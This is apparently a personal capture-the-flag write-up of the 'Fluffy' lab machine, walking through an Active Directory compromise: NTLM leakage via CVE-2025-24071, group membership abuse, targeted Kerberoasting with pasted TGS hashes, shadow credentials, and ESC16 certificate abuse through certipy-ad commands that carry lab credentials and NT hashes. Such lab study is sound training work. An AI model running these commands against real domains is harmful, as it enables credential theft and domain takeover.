![image 101.png](assets/Fluffy/image%20101.png)
![image 1 67.png](assets/Fluffy/image%201%2067.png)
  
  
![image 2 66.png](assets/Fluffy/image%202%2066.png)
- access to IT share
  
![image 3 59.png](assets/Fluffy/image%203%2059.png)
- in their smb share they had pdf’s with CVEs they’re vulnerable to
  
looking into CVE-2025-24071 gives us this github for leaking NTLMs
[https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom?tab=readme-ov-file](https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom?tab=readme-ov-file)
- follow that github, once it says host the file you can just use the put command in the IT share for their smb
  
![image 4 55.png](assets/Fluffy/image%204%2055.png)
  
  
  
![image 5 54.png](assets/Fluffy/image%205%2054.png)
- pretty sure you have to host the smb server after putting but i did before and after and it just worked
  
![image 6 50.png](assets/Fluffy/image%206%2050.png)
![image 7 48.png](assets/Fluffy/image%207%2048.png)
  
p.agila:prometheusx-303
  
![image 8 45.png](assets/Fluffy/image%208%2045.png)
- p.agila is part of the service account managers group, who has genericall over service accounts
  
![image 9 45.png](assets/Fluffy/image%209%2045.png)
- adding p.agila to service accounts group
- net rpc group addmem "Service Accounts" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "dc01.fluffy.htb”
  
![image 10 39.png](assets/Fluffy/image%2010%2039.png)
- verifying that p.agila got added
  
![image 11 37.png](assets/Fluffy/image%2011%2037.png)
- service accounts has genericwrite over winrm_svc
  
since we have genericwrite, we can do a targetedkerberoast attack and get some service hashes
![image 12 30.png](assets/Fluffy/image%2012%2030.png)
  
  
```JavaScript
ca_svc
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$9f3369bba979b83ac3ab03b60e8f076a$108c961637c8129b68e144b120cbe11f81f85c775a10f6ce78db15f3f4454935b58089d2a4b4a995cf9e74e79ed8688e9d44db4c59f5e609893ff73475e0b259349fef9e3d225b32239f02a9c2267e890133cf04ff5bbf291abf7b2bc72eaf6b1febd4666cec32a16241ec8a34c771b4009f513149298caabf666fbcf77812865c0e763f2d51fb85e8553be7eb5ce0470563d1e837cfb621f38a4b18274d64eb2e9954e540bb607affeaa709e400e368d75c11ea219975e8a9148a2e2b2bda1e9039e4a9e7586ccded558cbaf9034c041c74dfeba3300b777e896987fcc425118b9706a3b8a3ee98ba0cd6a54be3f399b88664ce719ca7bfde39d388fd094d156fe00482411ae12312b6c5042e5bf72a283ecbc336f169a4543cf163d74e856ce2dd48fdfd5437efb44328d6796577f7f6e8f96973bcdd49305204347799dbbc7f41f02388b87adc841ad6274be353617c6aa210a7963030458cbf142575cd09709c2352b5d250616505f4343a9d425549bdff96927479b7c82a7bcb7fbbd13cdbd1977ed8ec207cab97d413024d3010cfdb8f2e9b7398dfc92f6a82dd6dcb61c15153f0db0c71ae3de30ba8be6a3053ca936464eb4c12ab4cefeb209cd6c4e0c7f5c8d82d95e2fefc8aa92118db3d033db8fa8367e59921b6a454b0a7184c2306ad0acb08145ae198971ae860acbcb05ec24dd38cc8fc2cc19d3888dcf2169a468c3890de233cf44b8ac4fca4dd9400597bb8ca781a616cd7a0b06ada5c76403c88e9ef0a4237e8f220847d54dad88353b21e4187c2157e29c90666f1997940a36df72567bf4049a7ed22d713c5024fc5c9f4c0fc9cf14c4d45859e723528d4aac5c1fe96c2313bdb68784cd0fba73a1104a0455cf0445ae929f963a9c18f627f700cf49b09362be96457dc35be32d572fe4dc8eec3b08904acf48bba716148062f1e5d9f6fe37468715fd0123d74b7cb1497515929fc4d0b67f881366b07680eca6055baee89735c5994e52b527cbc2afa87071efae6328bc6069d5937bd6e734842363d44130f8c2bed4bf98583129839c2bd5965ce317130ec6878224eab84ec65f81dd7f778ac79d7fbe7fa84d8435df03dc16b090426256eb1036bcfc002f6021af6dec4ddb27dc5663e8ac4d40733ba9c7d2fd81a9c8652edd7baabb809c32c443bacfb74b1c46c1fc7e5a28185953f99fb3d04818f9697628c3f5739d6eefcef2bd4d39c0dc592a9ee8b5767e58af9cb7d26fe03aef3626d5067c4f549b2362d5d356bb45bd01f98c9e9c458b3c318a742f100bd374985345614d1620fa089298690fa275ea6c4f566d174ce4a4c6d1daaa4af9179a910bf19ec269d84175f89467dd7fae15d1c9272907d27b4501406102e1a05c465f0cd92d03fba0894185f2018a0aa67cdf18604b9b16931d841c05500839e5f06ae26eb07248a50cfe15b322de07f3b4f8e15f29e433705e8970520cd1671133be3d2e062a0c733eb6ab9fb17bb8c1915
ldap_svc
$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$cd48b7316fc4677402a10f78042ca3b2$1aa360bd1119ac1bb597ff62eaf160c4a1da431eb68ad095bc96e6339bcd826f098a7b85e6f577f6f0ac063422589092bb837e32aacc62f1fc403f1bde1323f4caaf41c26e0f8fa4f6181862c5330dc0b3fcd5a05bf2e09988b4ddb1eb823379175bc006cabedea1e92591c839b6d560c14299f5526fbe5bca2beb94940563385a6aa2eb7582ac08aaf033573bc6e1d4766f49830710ecba319f34a13800c85f2dcc5ab6a0e6acb586e1a31f26aa80bc8698bd0f50efd393da5e10a352e6815b36d9db8ac1288962e42f7f43a24551e70a342ba1330bacac151c3dab2042b78fdde11ed96212a08c551bf986194ac0457b1c92342593227cd7a157ba309e881c4730d9fcdad6c0fa6a7d7e27a4f5557ec44b8a96b209dc52ef476b6e151ecb7e6fcc0e75fccbdac38a2e440cce67b7daa7cea486e208ae6d1700142da035f03a093122ec9df95348c95496153bd86d02e4404d4976d8ea6cc4e1bc84f84998f2ca7620b2698fddfa41b07c10c217209aa66719aba118632033e33184cdf11f071868ecd52b0af55ac3cc65a914760779d58ce7fa5ddfce6dfec44c0613fa0343ad2bece683101c5aee7a115e9b9d0da910f95b9e6e4ec18387713e7a10e6ecf6d3b68a16827530d4b137c51355e4a309f2f4d9e719a8815b52e53633c14ff045721df1699f388672fd29de73d7257298263916dbb4cae974b90bf9c2c2dc96d45be7ca5dcebdb766c5cddeac3be998636c0baa271ed6ad494d33e4b84474b7c17c283be779fcdb0acb5e080cfa4266469d5fac64c19f1d4a13e38e7a1e9e3c53e1d4a03bc74b963723dbc0fa88b1cf656a3b54d13ec34d6fff57f5ec69e7eda39ad36ec5cc02a101d0c8ca097ddb927b885246d21a27620d4f270011602152ce86e3f73940e4529749515f1960c61e7f61ec1c98c3ce36d599b7d88c5d3e7b273a2ab1149ea7de42388387db90cb8c660b746022b7576b3651daab5265194073ea7df04c3b7a6c560b63b885ac255f8325d2e9027b25fff7b593b2f4b5b40cd8585839ae8376e1f00284295cf2a383e4f8d054bb386614774b40210778e4673ad8e0379be231444b8e8d9c7559f17536b96dcd4222325a65423c14daa6999e5db00f8b59b972e162fe890ec012107c1f959f73a8a591ff1c6bdd901c1e29b8b8bf66fbeb4d034de51f3c224bf299fabd05c343764875bcd040a983d54c5615d79352c8fdbb81c12cd8d27d7f06311132c501ceacd77685599ad78e8cf77f9533f99f3b7c9b9f7fde785a13f1a87e885eb98b25a49c59c8c837fdca8888dd6dc5ee589eb1eadce9070f14d5122c50402eab726276ed19896214ec79cf3c07f1047d563e6e77be1498a4caa403f673aa843df120acee3785b79fafb556921add005e6dddff6f1c791c7c603fc8f1a3292aa5ca1b20ed8c31f8724b08992b55debcc65133dd6ce42c5a88297ed055e81dedb40f3a30e1d45795badf621fc8cfbbfa63bfa7559a86710a8680
winrm_svc
$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$e40e604eb6ff607c19c374dfd1948302$a4f573233e6acf1ac5fee409b0e406c2c05da5e1e33295823dcb9ecea97dcf7f07118f2e339c85bf474039a2bad917c3e016e871e42b9d394a27e2a8fd23d1b7fbcd43b371477830f07cb1de2ce0e2d1e9b3e91f0ab14e63fd97a959122450dbb82fc0deac93e5ef723449224933741eef2209d6374f83ec59360e4f7d904fe8d2e2a0404dd05be917d328ad327a3cbd661309eb917bd915696cc39d6e2d0e45b3e7547e417c0b5f3c4ecdec48c9bfa662126b442d8513e64a040f6c9242410ac1bddc267122f79ff323e8839fea0a3a3ab569e7455991ff5251fd3b3babae194d7f08fad9a5aa1dbed74d4167709ccd49bb5071461dc0bacf571aa52f42d0de2bd5f6c5d89a591790f8d7bae20f0e2cb3ee5abaaa8edae0b3d86f76804c3203161c53b3d9062f5ddff63d483925073538993f6289e69e80afc768ab18bb6ee3dcce5a44efd9bdbafc6c2767043428ffbb6cf84c5bb5dc773d1e045f8ca68212e479f941257aa0e15dcaad2e4842055345d24fd417ee95a35b817e0872fca2b53da833ada95c76206bb976af6f0049a4498785bf781dfd363231a17f4d6d548a2b3efda0087509c60df5c7fa8ef3dd2d6dafb284ed53d088d470cee76ec8d2bfbf42e8d76a239df98701549485c6ca1c3b5b4d925343b82830c4d096785c8f36bc296553d4c4bb719291dddebed3d2b6761d8391747d81f6ae756cde0c576b0b9cae5949b0434156b498edab0390e9c9ce94e310df9d94fc1030f3a15a2470f71e6777ba3f6bbbce5f148f68cab1e1a495705e8e24212da9cefdd12c9066ee1d58c15c099f0ef8a0fe226e086fff5e43fe6620bebe83677ab7393dc2de2bf55d1cc19ecc260384b19ce9e5446c89f54a53f71a8e3dc1b394f70703f01aee3140c36035b94116567356ebc595589a17083616530b16c8e8bb66925c3e18da163a193577c7d8013ea3db00d7b26db17f3974681e4bd9ac621fd99f30d4b618fa2b8b9e058b29fe8597d0e68b4207300731211827dbf28c6e62061d2dfe3c5c206364c9240550b7239e3978f6f9a4e844737b471807f4ea57f8ad770ead1ced9e0da6cbed185305a3bec8ff3461d4f6198854e4563fd3d669ea4f2c81268548542a947bc26139e4e19ec2653cb88bc63757ff31162e73f68337e89d162ffcf741cf06166ae069ed96aac5e59163fecf3586c1c63f8aaf29055ee514d20cd7d0c138e9e070b6c811f53e42f162e9f8f9158ce8c1b427b8d811e68487536252ad55600ac4940889e89308428bbb725356a29414c6329e1d1723a5a78927226b1a7918a1ef8ee08e58c5c1ab96d7e4dd06135c1494a0d24936886ffb3c4889f2a364a06864c4991c3fd3bbcf06b98095ea61998ef05c237f28da0d0203341395991f2b0573ced526e9dc5730968bfed1577bf4f11e97aab2db16f80568978cab82eb7cd0ffe644c50df04cc7e1ca86fe1f9d8d5f6b62218e27e4cff01d18f61077edf27b37d6708a426c8564ce
```
- all of them said exhausted
  
going to try the shadow credential method instead
![image 13 30.png](assets/Fluffy/image%2013%2030.png)
![image 14 28.png](assets/Fluffy/image%2014%2028.png)
- pywhisker output gives you the name of the pfx file and the password for the file
- then use [gettgtpkinit.py](http://gettgtpkinit.py) to save the tgt to a file
![image 15 26.png](assets/Fluffy/image%2015%2026.png)
- need the key from this output to get the nt hash
    
    - f088d35802f45221ab6d176a754604b51f07adf553902c8df832c6ad6244ba2a
    
  
![image 16 23.png](assets/Fluffy/image%2016%2023.png)
- export the ccache
  
![image 17 19.png](assets/Fluffy/image%2017%2019.png)
- get the NT hash for winrm_svc
    
    - 33bd09dcd697600edf6b3a7af4875767
    
  
![image 18 18.png](assets/Fluffy/image%2018%2018.png)
- service accounts have genericwrite over ldap_svc and ca_svc
    
    - gonna have to do pywhisker again
    
![image 19 17.png](assets/Fluffy/image%2019%2017.png)
![image 20 14.png](assets/Fluffy/image%2020%2014.png)
![image 21 14.png](assets/Fluffy/image%2021%2014.png)
- ca_svc
  
![image 22 12.png](assets/Fluffy/image%2022%2012.png)
![image 23 11.png](assets/Fluffy/image%2023%2011.png)
![image 24 10.png](assets/Fluffy/image%2024%2010.png)
- ldap_svc
  
![image 25 6.png](assets/Fluffy/image%2025%206.png)
- esc16 🙂
  
![image 26 4.png](assets/Fluffy/image%2026%204.png)
  
to exploit ESC16, we need an account that has GenericWrite over another user
- in this case, p.agila has GenericWrite over ca_svc
![image 27 4.png](assets/Fluffy/image%2027%204.png)
- certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update
  
verify that the update went through
- the upn of the affected account should be administrator now
![image 28 4.png](assets/Fluffy/image%2028%204.png)
- certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -user 'ca_svc' read
  
  
![image 29 4.png](assets/Fluffy/image%2029%204.png)
- certipy-ad shadow -u 'p.agila' -p 'prometheusx-303' -dc-ip 10.10.11.69 -account ca_svc auto
- export KRB5CCNAME=ca_svc.ccache
  
![image 30 4.png](assets/Fluffy/image%2030%204.png)
- certipy-ad req -dc-ip 10.10.11.69 -u 'administrator' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -ca 'fluffy-DC01-CA' -target 'DC01.fluffy.htb' -template 'User’
  
to successfully complete ESC16 exploitation, you NEED to revert the UPN of the original account back or it won’t complete
![image 31 3.png](assets/Fluffy/image%2031%203.png)
- certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
  
![image 32 3.png](assets/Fluffy/image%2032%203.png)
- certipy-ad auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username administrator -domain 'fluffy.htb’